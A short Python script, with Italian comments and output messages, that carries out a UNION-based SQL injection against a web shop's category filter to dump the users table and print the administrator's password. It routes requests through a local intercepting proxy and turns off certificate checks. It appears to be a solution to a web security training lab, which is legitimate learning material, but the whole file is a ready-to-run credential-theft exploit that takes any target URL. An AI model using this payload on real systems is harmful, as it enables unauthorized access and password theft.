import requests
import sys
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies ={'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def exploit_sqli_users_table(url):
    username = "administrator"
    uri = "/filter?category=Tech+gifts"
    sql_payload = "' UNION SELECT NULL,username || '-' || password FROM users--"
    r = requests.get(url+uri+sql_payload, verify=False, proxies=proxies)
    response = r.text
    if username in response:
        # "administrator" -> ELEMENTO PADRE -> TROVA IL SUCCESSIVO "td" -> PRENDI IL CONTENUTO
        admin_usr_psw = re.findall(r"administrator.\w+",response)
        admin_password = admin_usr_psw[0].split("-")[1]
        print("[+] La password dell'utente 'administrator' è: " + admin_password)
        return True
    return False



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()


    print("[+] Scaricando la lista di nomi utente e password...")

    if not exploit_sqli_users_table(url):
        print("[-] Password di utente 'administrator' non trovata")
